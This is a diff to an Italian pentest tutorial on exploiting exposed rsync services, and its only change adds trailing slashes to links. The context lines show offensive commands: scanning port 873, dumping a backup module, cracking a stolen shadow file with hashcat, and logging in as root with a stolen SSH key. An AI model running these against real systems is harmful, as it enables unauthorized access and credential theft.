@@ -45,7 +45,7 @@ Esempio di configurazione vulnerabile:
 
 ### Scan con nmap
 
-Usa [nmap](https://hackita.it/articoli/nmap) per confermare il servizio e listare i moduli esposti:
+Usa [nmap](https://hackita.it/articoli/nmap/) per confermare il servizio e listare i moduli esposti:
 
 ```bash
 nmap -sV -sC -p 873 <target>
@@ -99,7 +99,7 @@ rsync -av rsync://<target>/backup/ /tmp/dump/
 
 **Cosa fai con quello che hai:**
 
-* `shadow` → crack con [hashcat](https://hackita.it/articoli/hashcat): `hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt`
+* `shadow` → crack con [hashcat](https://hackita.it/articoli/hashcat/): `hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt`
 * `id_rsa` → `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@<target>`
 * `rsyncd.secrets` → password per i moduli protetti
 
@@ -182,7 +182,7 @@ done
 
 ## Post-Exploitation: Cosa Fare Dopo la Shell
 
-Una volta dentro, usa [LinPEAS](https://hackita.it/articoli/linpeas) per enumerare il sistema e trovare vettori di privilege escalation.
+Una volta dentro, usa [LinPEAS](https://hackita.it/articoli/linpeas/) per enumerare il sistema e trovare vettori di privilege escalation.
 
 ***
 
